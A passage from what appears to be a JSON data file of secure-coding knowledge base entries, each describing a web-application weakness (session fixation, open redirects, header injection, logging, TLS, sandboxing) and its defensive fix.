session.\n\nEach different framework has its own guide to achieve this revocation.\nIt is also recommended for you to make test cases which you follow to ensure\nsession revocation in your application.\n"}, {"kb_id": 58, "title": "The login functionality should always generate a new session id", "content": " Description:\n\nWhenever an user is successfully authenticated the application should generate a\nnew session cookie.\n\n Solution:\n\nThe login functionality should always generate (and use) a new session ID after a\nsuccessful login. This is done to prevent an attacker doing a session fixation attack\non your users.\n\nSome frameworks do not provide the possibility to change the session ID on login such as\n.net applications. Whenever this problem occurs you could set an extra random cookie on\nlogin  with a strong token and store this value in a session variable.\n\nNow you can compare the cookie value with the session variable in order to prevent\nsession fixation since the authentication does not solely rely on the session ID since\nthe random cookie can not be predicted or fixated by the attacker.\n"}, {"kb_id": 59, "title": "Does The application enforce the use of secure passwords", "content": " Description:\n\nApplications should encourage the use of strong passwords and passphrases. Preferably the\npassword policy should not put limitations or restrictions on the chosen passwords (for example\nthe length of a password). Whenever the application supports strong passwords and\nthe use of password managers, the possibility for an attacker performing a succesfull bruteforce \nattack drops significantly.\nThis also increases the possibility that the application can be used with users'' passwords managers.\n\n Solution:\n\nVerify password entry fields allow, or encourage, the use of passphrases, and do not prevent\npassword managers, long passphrases or highly complex passwords being entered. \nA password ideally should be:\n* at least 12 characters in length\n* passwords even longer than 64 characters are allowed\n* every special characters from Unicode charset should be permitted (including emoki, kanji, multiple whitespaces, ecc.)\n* No limit for the number of characters allowed from the same type (lowercase characters, uppercase characters, digits, symbols) \n"}, {"kb_id": 60, "title": "Session IDs do not timeout (idl)", "content": " Description:\n\nAll sessions should implement an idle or inactivity timeout.\nThis timeout defines the amount of time a session will remain active in case there is no\nactivity in the session, closing and invalidating the session upon the defined idle period\nsince the last HTTP request received by the web application for a given session ID.\nThe idle timeout limits the chances an attacker has to guess and use a valid session ID\nfrom another user. However, if the attacker is able to hijack a given session,\nthe idle timeout does not limit the attacker''s actions, as he can generate activity on\nthe session periodically to keep the session active for longer periods of time.\n\nSession timeout management and expiration must be enforced on the serverside. If the client is\nused to enforce the session timeout, for example using the session token or other client\nparameters to track time references (e.g. number of minutes since login time), an attacker\ncould manipulate these to extend the session duration.\n\n Solution:\n\nAll user sessions should timeout based on logic serverside in order to decrease an\nattackers attack vector on the user session.\n"}, {"kb_id": 61, "title": "Directory listing", "content": " Description:\n\nWhenever directory listing is enabled, an attacker could gain sensitive information about\nthe systems hierarchical structure and gain knowledge about directories or files which should\npossibly not be publicly accessible. An attacker could use this information to\nincrease his attack vector. In some cases this could even lead to an attacker gaining knowledge about\ncredentials or old vulnerable system demo functions which might lead to remote code execution.\n\n Solution:\n\nDifferent types of servers require a different type of approach in order to disable\ndirectory listing. For instance: Apache uses a .htacces in order to disable directory listing.\nAs for iis7, directory listing is disabled by default.\n"}, {"kb_id": 62, "title": "Unnecessary features enabled or installed", "content": " Description:\n\nWhenever there are unnecessary features enabled or installed this could increase\nthe attack surface of an attacker which could lead to serious danger such as XXE/CMD/XSS injections.\n\n Solution:\n\nMake sure all features and software available on the application/server are necessary for\napplication to work proper. If not, uninstall or disable these services.\n"}, {"kb_id": 63, "title": "Avoid the use of default and predictable acounts.", "content": " Description:\n\nWhenever default or predictable accounts are available on an application/server this could\nlead to an attacker compromising these services. Make sure all default and predictable\naccounts are disabled or deleted from the services.\n\n Solution:\n\nVerify that all keys and passwords are replaceable, and are generated or\nreplaced after installation time.\n"}, {"kb_id": 64, "title": "Security settings in your development frameworks", "content": " Description:\n\nWhenever certain security settings in your application frameworks\n(e.g., Struts, Spring, ASP.NET) and libraries are not set to secure values, this could lead\nto vulnerabilities in your application which an attacker could exploit.\n\n Solution:\n\nMake sure all your security settings in your development framework are set to secure values.\nThis can be checked by using hardening guides.\n"}, {"kb_id": 65, "title": "Insecure datastorage", "content": " Description:\n\nWhenever sensitive data is stored cleartext, this data is compromised as soon as it\nfalls into the hands of an attacker.\n\n Solution:\n\nSensitive data in all forms should always be stored by an encrypted manner.\nWe recommend to follow the \"Secure Cryptographic datastorage\" cheatsheet found on OWASP.\n\nhttps://www.owasp.org/index.php/Cryptographic_Storage_Cheat_Sheet\n"}, {"kb_id": 66, "title": "Authentication based on the knowledge of a secret URL", "content": " Description:\n\nThis is a form of security by obscurity. Whenever an attacker manages to fuzz or spider\nthis URL the application could compromise whatever is behind this URL.\n\n Solution:\n\nAlways implement proper authentication mechanisms that are not using a static authentication URL.\n"}, {"kb_id": 67, "title": "Open forward and Open redirects", "content": " Description:\n\nUnvalidated redirects and forwards are possible when a web application accepts untrusted\ninput that could cause the web application to redirect the request to a URL contained\nwithin the untrusted input. By modifying untrusted URL input to a malicious site, an attacker\nmay successfully launch a phishing scam and steal user credentials. Because the server\nname in the modified link is identical to the original site, phishing attempts may have\na more trustworthy appearance. Unvalidated redirect and forward attacks can also be used\nto maliciously craft a URL that would pass the application''s access control check and\nthen forward the attacker to privileged functions that they would normally not be able\nto access.\n\n Solution:\n\nUse a whitelisting method for determining where the user should be redirected towards.\nYou could also show a warning when redirecting to potentially untrusted content.\n\nIf not deemed necessary user supplied input should not be used in redirects and forwards anyways.\n"}, {"kb_id": 68, "title": "Incorrect or missing charset", "content": " Description:\n\nWhen the browser has to guess the charset according to the content that is presented by\nthe application, then this could lead to XSS injections when the guess is wrong.\n\n Solution:\n\nDefine the charset for all your pages in order to prevent the browser for guessing\nthe content types.\n\nThis could be done by adding a meta header in the head of your HTML like:\n\nFor HTML4:\n```html\n<meta httpequiv=\"ContentType\" content=\"text/html;charset=ISO88591\">\n```\nFor HTML5:\n```html\n<meta charset=\"UTF8\">\n```\nOr simply by setting contenttype headers by your serverside language,\nC example of a content type header:\nResponse.AppendHeader(\"ContentType:text/html\", \"charset=UTF8\");\n"}, {"kb_id": 69, "title": "Extraneous files in document root", "content": " Description:\n\nWhenever the document root contains extraneous files, these files could be accessed by an\nattacker or could possibly contain functionality which could contain other vulnerabilities.\n\n Solution:\n\nExtraneous files in document root should be investigated and deleted if it''s not necessary\nfor the operation of the application.\n\nThere are more chances of accessing hidden folders, files and some configuration files to be\naccessed through document root.\n\nFor example if you are using some version control system like git or svn. You may have .git,\n.svn folders and .gitignore files. If you are using IDE project files, you may have .idea hidden folder. Even there are chances of configuration files with common extensions, like config.json, config.yml, config.xml, package.json, .htaccess, README.md files to be present in the document root.\nEven there are chances of having swap files, backup files to be there in the document root.\n\nThe solution for this problem is to prevent directory listing , remove the hidden folders, files and configuration files. We can even prevent the users from accessing this files with properly \nconfiguring the configuration files of the server like .htaccess files."}, {"kb_id": 70, "title": "Username enumeration", "content": " Description:\n\nWhenever an application generates an error like:\n\n\"This username already exists\"\n\nAn attacker could enumerate these usernames, enlarging his chance for a successful\nbruteforce attack. Same goes for \"Password forget\" functions.\n\nWhenever an user forgets his password, make him fill in his email address\nrather than an username.\n\n Solution:\n\nAll error messages should be generalized in order to prevent username enumeration.\nAlso sometimes you cannot avoid information leaking in functionalities such as a\nregistration page. Here you need to use tarpitting methods to prevent an automated\nattack by an attacker.\n\n"}, {"kb_id": 71, "title": "HTTP header injection", "content": " Description:\n\nHTTP header injection is a general class of web application security vulnerability which\noccurs when Hypertext Transfer Protocol (HTTP) headers are\ndynamically generated based on user input. Header injection in HTTP responses can allow\nfor HTTP response splitting (also known as CRLF, Carriage Return Line Feed),\nSession fixation via the SetCookie header, crosssite scripting (XSS),\nand malicious redirect attacks via the location header. HTTP header injection is a\nrelatively new area for webbased attacks, and has primarily been pioneered\nby Amit Klein in his work on request/response smuggling/splitting.\nVulnerabilities due to HTTP header injections such as CRLF are no longer\nfeasible due to the fact that multiple header requests are not possible.\n\n Solution:\n\nWhen userinput will be used in HTTP headers then the newlines should be escaped in a\ncorrect manner. Recommended would be a whitelist of expected input or use a validation method\nwhich for example only accepts alphanumeric values. Every detection of input which is out of\nthe intended operation should be rejected.\n"}, {"kb_id": 72, "title": "GET POST requests", "content": " Description:\n\nAuthors of services which use the HTTP protocol SHOULD NOT use GETbased forms for the\nsubmission of sensitive data, because this will cause this data to be\nencoded in the RequestURI. Many existing servers, proxies,\nand browsers will log the request URL in some place where it might be\nvisible to third parties. Servers can use POSTbased form submission instead.\nGET parameters are also more likely to be vulnerable to XSS. Please refer to the\nXSS manual in the knowledge base for more information.\n\n Solution:\n\nWhenever transmitting sensitive data always do this by means of the POST request or by header.\nNote: Avoid userinput in your application header, this could lead to vulnerabilities.\nAlso make sure you disable all other HTTP request methods which are unnecessary for\nyour applications operation such as; REST, PUT, TRACE, DELETE, OPTIONS, etc, since\nallowing these request methods could lead to vulnerabilities and injections.\n"}, {"kb_id": 73, "title": "Insecure internal communication", "content": " Description:\n\nWhenever organizations communicate by means of unencrypted connections, an attacker\ncould easily sniff insecure communications and access sensitive information.\n\n Solution:\n\nUse TLS encrypted data lines for all internal communication channels.\nAlso, your infrastructure should not traverse unencrypted or weakly encrypted links. Because\nif so, all your data''s integrity and confidentiality will be lost.\n"}, {"kb_id": 74, "title": "Sensitive information stored alongside the source code", "content": " Description:\n\nSometimes when developing an application a programmer stores a password or other\ncredentials into the sourcecode as a comment for other developers to\nlogin into the application. When these comments still exist in a live environment,\nan attacker could use these credentials to gain access to the system.\n\n Solution:\n\nSearch your source code for comments which contains possible usercredentials.\nYou should also verify that there are no secrets and API keys are included in the\nsource code, or end up within the resulting binary.\n\nThis also applies to providing information about business logic and other critically sensitive\ninformation. Verify that there is no sensitive business logic, secret keys or other\nproprietary information in client side code.\n"}, {"kb_id": 75, "title": "The possible risks to the application must be documented", "content": " Description:\n\nThe information that is stored of the application and/or user\nactivities needs to be documented, this will make it transparent where sensitive\ninformation is stored and why.\n\n Solution:\n\nCreate a section in the documentation of the project that defines the information\nthat will be stored. This makes it easier to make estimations about critical parts\nof your application which deserve extra attention.\n"}, {"kb_id": 76, "title": "Possible attackers of the application must be documented", "content": " Description:\n\nAuthentication decisions should be logged along with relevant metadata for security \ninvestigations. This information could for example, be used whenever there is suspicion about\naccounts being compromised. Also, passwords and other sensitive information should never be stored\nin these log files. Whenever an attacker gains knowledge of these files, this information\ncould be used to compromise other accounts. \n\nNote: \"Usernames should also never be stored in the log files, users are not always paying\nattention to their actions and sometimes provide the username form field with their password.\nIf the application would log the usernames, these passwords are now also stored and can be\nused to compromise accounts whenever an attacker gains knowledge of these files.\n\n Solution:\n\nVerify that all authentication decisions can be logged, without storing sensitive session \nidentifiers or passwords. This should include requests with relevant metadata\nneeded for security investigations.\n"}, {"kb_id": 77, "title": "Audit logs", "content": " Description:\n\nAn audit trail (also called audit log) is a securityrelevant chronological record,\nset of records, and/or destination and source of records that provide documentary\nevidence of the sequence of activities that have affected at any time a specific operation,\nprocedure, or event.\n\n Solution:\n\nAn audit log should contain the following items:\n\n User ID\n Operation\n Success/failure of the operation\n Privileges\n Timestamp\n\nDepending on the gravity of the users violation, there should also be a record kept for\neach user to lock their accounts after a certain number of violations. This should be\napplied since we can now assume it is an attacker trying to compromise your application.\n\nAlso when doing audit logs, make sure you always do logging before taking action in case the\naction is not properly processed or terminated by your application. When using this\napproach you are always in possession of an complete audit trail.\n"}, {"kb_id": 78, "title": "User credentials in audit logs", "content": " Description:\n\nWhenever there are user credentials supplied in an audit log,\nthis could become a risk whenever an attacker could gain access to one of these log files.\n\n Solution:\n\nInstead of storing user credentials, you may want to use user ID''s in order to\nidentify the user in the log files.\n\n"}, {"kb_id": 79, "title": "Intrusion detecting and reporting", "content": " Description:\n\nAll possible attacks on your application should be detected and reported in order to\nprevent further escalation.\n\n Solution:\n\nIntrusion detecting could be done by means of a:\n\n\"Positive security model:\"\nIn this model, you create certain regular expressions in order to only make the application\npass the socalled \"known good\".\nWhenever an application detects strange behavior and anomalies,\nthese issues should be reported. Keep in mind whenever the application changes, this\nwhitelist method has to evolve alongside with it. A big con is it could generate a lot\nof reports and alerts.\n\n\"Negative security model:\"\nCreate a blacklist with known attacks and malicious input and make the application report\non detection of this input. You could also prioritise different malicious input and\nclassify them into different groups.\n\nWhatever method you may choose to prefer, you should always ensure error handling logic in\nsecurity controls denies access by default. With this approach applied, you will have a\nhigher probability that whenever an attacker manages to break your applications intended\noperation, it will not fail in a way which increases his attack vector.\n"}, {"kb_id": 80, "title": "Authentication at a central location", "content": " Description:\n\nAuthentication should always be performed at a central location in the application, in\norder to prevent missing authentication on certain levels in the application.\n\n Solution:\n\nUse a central location for authentication. If u want to put extra constraints on the\nusers for accessing critical parts of your application, you have to implement\nstepup or adaptive authentication mechanisms.\n\nVerify that alternative and less secure access paths do not exist.\n"}, {"kb_id": 81, "title": "IP adresses in internal HTTP headers", "content": " Description:\n\nWhenever IP addresses are used in HTTP headers in internal structures of your organization,\nan attacker could use these to enlarge his attack vector and reconstruct your\ninternal infrastructures.\n\n Solution:\n\nNever use IP addresses in internal HTTP headers.\n"}, {"kb_id": 82, "title": "Authentication enforced by the web sever", "content": " Description:\n\nAuthentication should be enforced by the webserver. Whenever these configurations are\nnot enforced on the server, an attacker could gain access to authorized\npages on your application.\n\n Solution:\n\nAlways make sure your webserver and application are correctly configured to handle authentication. Also the application and webserver should deny access by default should there be an error of any kind.\n"}, {"kb_id": 83, "title": "The audit log must include a priority system", "content": " Description:\n\nIf the audit log does not contain a clear priority system, it will be difficult to\nprioritize different types of process failures.\n\n Solution:\n\nWhenever the webapplication is writing error messages to the error log, then these need\nto have a correct priority label. The labels that you can use are LOW, MEDIUM and HIGH.\nThese labels can then be used at a later moment in time for easy and quick analysing\ncapabilities of the log files.\n\nYou should also verify security logging controls, provide the ability to log success and\nparticularly failure events that are identified as securityrelevant.\n"}, {"kb_id": 84, "title": "Servers must not be trusted without explicit authentication", "content": " Description:\n\nWhenever the server your webapplication is connecting towards is not using any form of\nexplicit authentication and is internet facing, then this means the server\ncannot be trusted. This is because the server can be potentially be owned and managed by\neverybody including hackers.\n\n Solution:\n\nWhenever the webapplication is facing the internet third parties trying to\naccess it should always use a form of authentication in order to gain access.\n"}, {"kb_id": 85, "title": "Ensure overall security", "content": " Description:\n\nThe primairy authentication mechanism is most often a good hardened functionality\nbecause it gets a lot of attention during development. However, this is mostly not the\ncase for secondary authentication mechanisms such as password forget functions, or \nother alternative paths that could lead to authenticating to the target application.\n\n Solution:\n\nVerify all account identity authentication functions (such as update profile, forgot password, \ndisabled / lost token, help desk or IVR) that might regain access to the account are \nat least as resistant to attack as the primary authentication mechanism.\n"}, {"kb_id": 86, "title": "Re authentication", "content": " Description:\n\nWhenever a user is changing credentials such as his password, the user should always be\nchallenged by the application to reauthenticate himself. This is in order to prevent an\nattacker from changing credentials if ever an attacker could hijack another users session.\n\n Solution:\n\nVerify that the changing password functionality includes the old password,\nthe new password, and a password confirmation, as well as a passphrase strength indication\nto encourage the adoption of strong password phrases. This same principle applies for other operations\nthat are considered critical such as changing an email adress or phone number.\n"}, {"kb_id": 87, "title": "No shared knowledge for secret questions", "content": " Description:\n\nWhenever an application ask an user a secret question i.e a password forgot\nfunctionality, these questions should not be shared knowledge an attacker could get from\nthe web to prevent him compromising the account by this function.\n\n Solution:\n\nSecret questions should never include shared knowledge, predictable or easy\nguessable values.\n\nOtherwise the answers for these secret questions can be easilly looked up on the internet by means \nof social media accounts and the like.\n"}, {"kb_id": 88, "title": "Disallow the use of old passwords", "content": " Description:\n\nThis is a mitigation of the risk that a password can leak by any means towards a possible attacker. Because of password reuse, this could happen not only due to a leak in your site. Changing the password to a new one minimizes the damage.\n\nAlso, users really don''t like changing their passwords. So what users used to do when forced to change their password was to change it twice  once to some temporary password and then a second time back to the original password.\n\n Solution:\n\nKeep a number of password hashes entries greater than the number of times that the change password functionality execution is permitted and validate that the new password hash is not one of those entries.\n"}, {"kb_id": 89, "title": "Absolute session time out", "content": " Description:\n\nAll sessions should implement an absolute timeout, regardless of session activity.\nThis timeout defines the maximum amount of time a session can be active,\nclosing and invalidating the session upon the defined absolute period since the given\nsession was initially created by the web application. After invalidating the session,\nthe user is forced to (re)authenticate again in the web application and establish\na new session. The absolute session limits the amount of time an attacker can use a\nhijacked session and impersonate the victim user.\n\n Solution:\n\nAlways ensure that sessions absolute timeout  is on the serverside in order to decrease a hackers\nattack vector.\n"}, {"kb_id": 90, "title": "Logout structuring", "content": " Description:\n\nPlacing a logout link on every page that requires authentication helps the user end the\nsession when he is done with the site. Ending the session helps prevent hijacking.\n\n Solution:\n\nIdentify all pages that use authentication. Make a list of all pages on your site that use\nauthentication then verify the presence of logout links. Examine each page that uses\nauthentication to make sure it has a logout link in a location that can be\nfound intuitively.\n"}, {"kb_id": 91, "title": "Verify that the sensitive information is never disclosed", "content": " Description:\n\nInformation exposure through query strings in URL is when sensitive data is passed to parameters in the URL. This allows attackers to obtain sensitive data such as usernames, passwords, tokens (authX), database details, and any other potentially sensitive data. Simply using HTTPS does not resolve this vulnerability.\n\nRegardless of using encryption, the following URL will expose information in the locations detailed below: https://vulnerablehost.com/authuser?user=bob&authz_token=1234&expire=1500000000\n\nThe parameter values for ''user'', ''authz_token'', and ''expire'' will be exposed in the following locations \nwhen using HTTP or HTTPS:\n\n Referer Header\n Web Logs\n Shared Systems\n Browser History\n Browser Cache\n Shoulder Surfing\n\nWhen not using an encrypted channel, all of the above and the following:\n ManintheMiddle\n\n\n Solution:\n\nSensitive informtion should never be included in the URL.\n"}, {"kb_id": 92, "title": "Session Domain cookies", "content": " Description:\n\nThe Domain option allows you to specify whether or not to send the cookie to subdomains.\n\n Solution:\n\nSetting www.example.com will mean only the exact domain www.example.com will\nbe matched, while .example.com (wildcard) will also match again any\nsubdomain (forums.example.com, blog.example.com).\n\nThe use of a wildcard is not recommended at all and should be avoided.\n\nThere are a lot of different mitigations in order to harden your session management.\nThese mitigations are amongst others the setting of the \"HttpOnly and secure\" flags on\nyour sessions. Follow the \"Sessions pattern\" list to make sure your session management is\nsecure.\n\nRecommended knowledge base items:\n\n Cross subdomain cookie attacks\n\n"}, {"kb_id": 93, "title": "Access control failure", "content": " Description:\n\nHandling errors securely is a key aspect of secure coding. There are two types of errors\nthat deserve special attention. The first is exceptions that occur in the processing of a\nsecurity control itself. It is important that these exceptions do not enable behavior\nthat the countermeasures would normally not allow. As a developer, you should consider\nthat there are generally three possible outcomes from a security\nmechanism: \n\n allow the operation\n disallow the operation\n exception \n\nin general you should design your security mechanism so that a failure will follow the same\nexecution path as disallowing the operation.\n\n Solution:\n\nSecurity methods like isAuthorized(), isAuthenticated(), and validate() should all return\nfalse if there is an exception during processing.\nIf security controls can throw exceptions, they must be very clear about exactly what that\ncondition means.\n"}, {"kb_id": 94, "title": "Input rejection", "content": " Description:\n\nWhenever the application detects malicious or unexpected userinput, you want to make sure\nthe application actual rejects the submitted userinput rather than directly process it.\n\n Solution:\n\nVerify that the application actually rejects the user requests whenever malicious input\nis detected by your application. The base of this process will be checking the application\nfor expected userinput, for example: Whenever the user is filling in a form which\ncontains a checkbox, there are fixed values which your application can expect from\nthe user to return. Whenever this value differs from what the application served the user\nas possible answers, you can assume the request was corrupted and you reject the request.\n\nYou must also keep track of the users movements by adding an audit trail as well as a\ncounter for tracking the number of his violations(submitting bad input) in your input\nvalidation class. You should enforce a lockout whenever a unreasonable number of\nviolations are detected by your application in order to protect it from attackers.\n\n"}, {"kb_id": 95, "title": "Input validation", "content": " Description:\n\nTo ensure that the application is robust against all forms of input data, this data should\nbe sanitized and/or encoded on serverside since an attacker could otherwise easy bypass\nthese checks with an intercepting proxy.\n\n Solution:\n\nAll input validation and encodingroutines should be implemented on the serverside\noutside the reach of an attacker. Just as with the input rejection you should make sure that\nafter validating the userinput, whenever the input is bad it actually rejects, sanitizes\nor formats your userinput into not malicious data.\n\nThe recommended method for validating user input would be the positive validation method.\nWhitelist input validation means allowing only input that is explicitly defined as valid,\nas opposed to blacklist input validation, which filters out known bad input.\n\nYou must also keep track of the users movements by adding an audit trail as well as a\ncounter for tracking the number of his violations(submitting bad input) in your input\nvalidation class. You should enforce a lockout whenever a unreasonable number of\nviolations are detected by your application in order to protect it from attackers.\n\n\n"}, {"kb_id": 96, "title": "Single input validation controls", "content": " Description:\n\nInput validation refers to the process of validating all the input to an application\nbefore using it. Input validation is absolutely critical to application security,\nand most application risks involve tainted input at some level.\n\n Solution:\n\nVerify that a single input validation control is used by the application for each\ntype of data that is accepted. This way your validation controls stay clear, transparent\nand manageable. This method leaves less room for error.\n\n"}, {"kb_id": 97, "title": "Logging validation failures", "content": " Description:\n\nWhen you log all the input validation failures in your application you can discover in an\nearly stage that your application is under attack and take quick countermeasures against\nthe attackers.\n\n Solution:\n\nVerify that all input validation failures are logged in order to counter possible attacks\nin an early stage. Also you want to verify that error handling logic in security controls\ndenies access by default.\n"}, {"kb_id": 98, "title": "Logging implemented on the serverside", "content": " Description:\n\nLogging should always be implemented on the serverside since an attacker otherwise \nmanipulates the functionality and erases his traces.\n\n Solution:\n\nVerify that all logging controls are implemented on the serverside.\n"}, {"kb_id": 99, "title": "Logging guidelines", "content": " Description:\n\nThe logging should contain some guidelines in order to organize your logging file in such\na way it  would allow for a detailed investigation of the timeline when an event happens.\n\n Solution:\n\nThe logging file should at least contain, a timestamp from a reliable source, severity\nlevel of the event, an indication that this is a security relevant event\n(if mixed with other logs), the identity of the user that caused the event\n(if there is a user associated with the event), the source IP address of the request\nassociated with the event, whether the event succeeded or failed, and a\ndescription of the event. Also verify that log fields from trusted and untrusted sources\nare distinguishable in log entries, preferably stored in different files so they cannot\ntaint each other whenever log injection occurs.\n\nVerify accessing sensitive data is logged, if the data is collected under relevant data protection\ndirectives or where logging of accesses is required.\n"}, {"kb_id": 100, "title": "Log viewing software code injection", "content": " Description:\n\nWhenever user supplied input is being handled into log viewing software, this software can be manipulated by potential attackers whenever this input is not properly being sanitized before outputting in the software. Depending on the context of where the supplied input is being used this could lead to an entire subset of attacks.\n\n Solution:\n\nYou should consider these three controls when supplying information to the log viewing software:\n    \u2022\tDesign: If at all possible, avoid logging data that came from external inputs.\n    \u2022\tImplementation: Ensure that all log entries are statically created, or if they must record external data that the input       is vigorously whitelist checked.  \n    \u2022\tRun time: Avoid viewing logs with tools that may interpret control characters in the file, such as commandline shells.\n\nAlso verify that all nonprintable symbols and field separators are properly encoded in log entries, to prevent log injection.\n"}, {"kb_id": 101, "title": "CA certificates", "content": " Description:\n\nIn cryptography, a certificate authority or certification authority (CA) is an entity that\nissues digital certificates. A digital certificate certifies the ownership of a public key\nby the named subject of the certificate. Sometimes it happens that a CA goes bad and is\nrevoked from the browser. This will lead to untrusted TLS connections if your application\nuses an issued certificate from this CA.\n\nA selfsigned certificate is an identity certificate that is signed by the same entity whose identity it certifies. This term has nothing to do with the identity of the person or organization that actually performed the signing procedure. In technical terms a selfsigned certificate is one signed with its own private key.\n\nIn typical public key infrastructure (PKI) arrangements, a digital signature from a certificate authority (CA) attests that a particular public key certificate is valid. Each CA has one or more root keys; and the certificates associated with those public keys are \"trust anchors\" that use a special type of selfsigned certificates. Establishing trust of the CA root certificate is dependent upon procedures beyond checking its digital signature.\n\n Solution:\n\nIn a CA based PKI system, the CA must be trusted by both parties. This is usually accomplished by placing the CA certificates in a whitelist of trusted certificates. For example, web browsers developers may use procedures specified by the CA/Browser Forum, or a private CA''s certificate may be placed in the firmware of an embedded system. The trust issues of an entity accepting a new selfsigned certificate, is similar to the issues of an entity trusting the addition of a new CA certificate. The parties in a selfsigned PKI must establish trust with each other (using procedures outside the PKI), and confirm the accurate transfer of public keys (e.g. compare the hash out of band).\n\nThere are many subtle differences between CA signed and selfsigned certificates, especially in the amount of trust that can be placed in the security assertions of the certificate. Some CAs can verify the identity of the person to whom they issue a certificate; for example the US military issues their Common Access Cards in person, with multiple forms of other ID. The CA can attest identity values like these by including them in the signed certificate. The entity that validates the certificate can trust the information in that certificate, to the same extent that they trust the CA that signed it (and by implication, the security procedures the CA used to verify the attested information).\n\nWith a selfsigned certificate by contrast, trust of the values in the certificate are more complicated because the entity possesses the signing key, and can always generate a new certificate with different values. For example, the validity dates of a selfsigned certificate might not be trusted because the entity could always create and sign a new certificate that contained a valid date range. The values in a selfsigned certificate can be trusted when the following conditions are true: the values were (outofband) verified when the selfsigned was formally trusted, and there is a method to verify the selfsigned certificate has not changed after it was trusted. For example, the procedure of trusting a selfsigned certificate includes a manual verification of validity dates, and a hash of the certificate is incorporated into the white list. When the certificate is presented for an entity to validate, they first verify the hash of the certificate matches the reference hash in the whitelist, and if they match (indicating the selfsigned certificate is the same as the one that was formally trusted) then the certificate''s validity dates can be trusted. Special treatment of X.509 certificate fields for selfsigned certificate can be found in RFC 3280.\n\nVerify that connections to and from the server use trusted TLS certificates. Where internally generated or selfsigned certificates are used, the server must be configured to only trust specific internal CAs and specific selfsigned certificates. All others should be rejected.\n"}, {"kb_id": 102, "title": "All connections should be TLS", "content": " Description:\n\nWhenever an application provides TLS, all connections should be TLS otherwise the\nencryption will be lost.\n\n Solution:\n\nVerify that TLS is used for all connections\n(including both external and backend connections) that are using authentication tokens or\nthat involve sensitive data or functions.\nThis should also be enforced in the application itself wherever possible,\nfor example: Secure flags on cookies, HSTS, certificate pinning etc.\n"}, {"kb_id": 103, "title": "Log TLS connection failures", "content": " Description:\n\nFailing TLS connections should always be logged. This is a great indicator that ''something'' is wrong.\n\n Solution:\n\nVerify that backend TLS connection failures are logged.\n"}, {"kb_id": 104, "title": "Content type headers", "content": " Description:\n\nSetting the right content headers is important for hardening your applications security,\nthis reduces exposure to driveby download attacks or sites serving user uploaded\ncontent that, by clever naming could be treated by MS Internet Explorer as executable or\ndynamic HTML files and thus can lead to security vulnerabilities.\n\n Solution:\n\nAn example of a content type header would be:  \n\n    ContentType: text/html; charset=UTF8\n    or:\n    ContentType: application/json;\n    \n    \nVerify that requests containing unexpected or missing content types are rejected with appropriate headers (HTTP response status 406 Unacceptable or 415 Unsupported Media Type).\n"}, {"kb_id": 105, "title": "Malicious intent", "content": " Description:\n\nBefore pushing a code live you should check the software for malicious code in order to\nmake sure no developers with evil intent made backdoors or deliberately put in exploits.\n\nDependencies and third party libraries should also be validated against malicious code.\nThese depedencies and libraries should also be validated for known vulnerabilities (CVE)\n\n Solution:\n\nRunning your code through a static code analyzer or auditing tools could give you a chance\nto find malicious pieces of code which could be embedded into the software.\nAlso if the new or adjusted functionality is critical then check manually it in the form\nof a code review for back doors, Easter eggs, and logic flaws.\n\nThis should also mean that authorized administrators must have the capability to verify the integrity of\nall securityrelevant configurations to ensure that they have not been tampered with.\n\nDetermine also that the business logic of highvalue transactions is not imported from untrusted third party libraries.\n\nNote:\nStudies have shown backdoors written by employees with malicious intend will propably do this within\nthe first half year of their employment. The implementing of back doors has little to do with how happy an\nemployee is with the current employer, it has proven to be a trait of character rather than a trait of discontent.\n"}, {"kb_id": 106, "title": "Sandboxing", "content": " Description:\n\nA sandbox is a security mechanism for separating running programs.\nIt is often used to execute untested code, or untrusted programs from\nunverified third parties, suppliers, untrusted users and untrusted websites. It''s creating\nan extra layer of security where an attacker first needs to break out from.\n\n Solution:\n\nExamples of sandbox implementations include the following:\nA jail: networkaccess restrictions, and a restricted file system namespace. Jails are most commonly used in virtual hosting.\nRulebased execution gives users full control over what processes are started, spawned (by other applications), or allowed to inject code into other applications and have access to the net, by having the system assign access levels to users or programs according to a set of determined rules. It also can control file/registry security (what programs can read and write to the file system/registry). In such an environment, viruses and Trojans have fewer opportunities of infecting a computer. The SELinux and AppArmor security frameworks are two such implementations for Linux.\nVirtual machines emulate a complete host computer, on which a conventional operating system may boot and run as on actual hardware. The guest operating system runs sandboxed in the sense that it does not function natively on the host and can only access host resources through the emulator.\nSandboxing on native hosts: Security researchers rely heavily on sandboxing technologies to analyze malware behavior  By creating an environment that mimics or replicates the targeted desktops, researchers can evaluate how malware infects and compromises a target host. Numerous malware analysis services are based on the sandboxing technology.\nCapability systems can be thought of as a finegrained sandboxing mechanism, in which programs are given opaque tokens when spawned and have the ability to do specific things based on what tokens they hold. Capabilitybased implementations can work at various levels, from kernel to userspace. An example of capabilitybased userlevel sandboxing involves HTML rendering in a Web browser.\nSecure Computing Mode (seccomp) is a sandbox built in the Linux kernel. When activated, seccomp only allows the write(), read(), exit(), and sigreturn() system calls.\nHTML5 has a \"sandbox\" attribute for use with iframes.\nJava virtual machines include a sandbox to restrict the actions of untrusted code, such as a Java applet.\nThe .NET Common Language Runtime provides Code Access Security to enforce restrictions on a untrusted code.\n\n```\n"}, {"kb_id": 107, "title": "Repudiation attack", "content": " Description:\n\nA repudiation attack happens when an application or system does not adopt controls to\nproperly track and log users actions, thus permitting malicious manipulation or forging\nthe identification of new actions. This attack can be used to change the authoring\ninformation of actions executed by a malicious user in order to log wrong data to log files.\nIts usage can be extended to general data manipulation in the name of others,\nin a similar manner as spoofing mail messages. If this attack takes place, the data stored\nin log files can be considered invalid or misleading.\n\n Solution:\n\nThis type of data should always be processed out of reach of the user and should be\nverified and enforced serverside.\n"}, {"kb_id": 108, "title": "Server side validation", "content": " Description:\n\nValidation of user supplied input must always be enforced on the server side.\nWhenever validation of the input is being perfomed on the client side then\nthe constraints can easilly be bypassed whenever an attacker uses an intercepting proxy\nwhich he can use to tamper data after they have been validated and send to the server. \n\nOr the attacker can simply change the constraint on the client side in his browser to bypass the \nconstraints.\n\n Solution:\n\nAll validation of input should be handled on the server side. Whenever the validation is handled on \nthe server side, the validation logic is outside of the scope of the attacker and he can not influence\nthe results.\n\nNote: Validation of input should never be done with a blacklisting aproach since attackers can be very\nnifty in bypassing these type of constraints. Always perform white list validation checks preferably in\ncombination on type checking. i.e if the application expects the value to be an integer, do not make\nthe application accept a value of a string. This input should be logged and rejected.\n"}, {"kb_id": 109, "title": "Privilege escalation", "content": " Description:\n\nAttackers with low access rights wil always try to elevate their privileges in order to get more sensitive information/functionalities at their disposal. This can be achieved by for example:\n\n  Functions that fail to check authorization\n  Compromised functions/services that 